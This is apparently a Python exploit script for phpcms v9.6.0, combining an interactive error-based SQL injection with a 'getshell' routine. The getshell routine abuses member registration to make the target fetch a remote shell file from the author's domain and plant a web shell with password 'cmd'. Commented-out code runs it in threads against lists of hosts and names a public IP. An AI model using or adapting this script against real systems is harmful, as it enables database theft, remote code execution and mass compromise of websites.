# phpcms v9.6.0 sqli and getshell
# code by : yaof
# blog : http://www.cnnetarmy.com
# SELECT * FROM `phpcmsv9`.`v9_download_data` WHERE  `id` = '' and updatexml(1,concat(1,(SELECT MID(flag, 6, 38) FROM flag)),1);

import requests
import random
import string
import urllib
import hashlib
import re
import threading

check_response = re.compile(r"(?<=XPATH syntax error: ').*?(?=')")


def sqli(host):
    try:
        url1 = '{}/index.php?m=wap&c=index&a=init&siteid=1'.format(host)
        s = requests.Session()
        req = s.get(url1)
        # flag = ''.join([random.choice(string.digits) for _ in range(2)])
        # flag_hash = hashlib.md5(flag).hexdigest()
        flag = raw_input("Input your SQL Injection:")
        flag = urllib.quote(flag)
        # url2 = '{}/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28md5%28{}%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26'.format(
        #         host, flag)
        url2 = '{}/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28{}%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26'.format(
                host, flag)
        cookies = requests.utils.dict_from_cookiejar(s.cookies)['svyko_siteid']
        data = {"userid_flash": cookies}
        r = s.post(url=url2, data=data)
        a_k = r.headers['Set-Cookie'][61:]
        url3 = '{}/index.php?m=content&c=down&a_k={}'.format(host, a_k)
        # if flag_hash[16:] in s.get(url3).content:
        #     print '[*] SQL injection Ok!'
        # else:
        #     print '[!] SQL injection ERROR.'
        # print str(s.get(url3).content)
        if re.search(check_response, str(s.get(url3).content)) is not None:
            print re.search(check_response, str(s.get(url3).content)).group()
    except:
        print 'requests error.'
        pass


def getshell(host):
    try:
        url = '%s/index.php?m=member&c=index&a=register&siteid=1' % host
        flag = ''.join([random.choice(string.lowercase) for _ in range(8)])
        flags = ''.join([random.choice(string.digits) for _ in range(8)])
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Upgrade-Insecure-Requests': '1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0'}
        data = "siteid=1&modelid=11&username={}&password=ad{}min&email={}@cnnetarmy.com&info%5Bcontent%5D=%3Cimg%20src=http://www.cnnetarmy.com/soft/shell.txt?.php#.jpg>&dosubmit=1&protocol=".format(
                flag, flags, flag)
        r = requests.post(url=url, headers=headers, data=data, timeout=5)
        # print r.content
        shell_path = re.findall(r'lt;img src=(.*?)&gt;', str(r.content))[0]
        print '[*] shell: %s  | pass is: cmd' % shell_path
        with open('ok1.txt', 'a')as tar:
            tar.write(shell_path)
            tar.write('\n')
    except:
        print 'requests error.'
        pass


if __name__ == '__main__':
    sqli('http://192.168.119.131/phpcms/install_package')
    # getshell('http://101.37.26.138/')
    # address = raw_input("Input your address plz:")
    # getshell(address)
    '''
	tsk = []
	f =  open('111.txt','r')
	for i in f.readlines():
		url = i.strip()
		t = threading.Thread(target = getshell,args = (url,))
		tsk.append(t)
	for t in tsk:
		t.start()
		t.join(0.1)
	'''
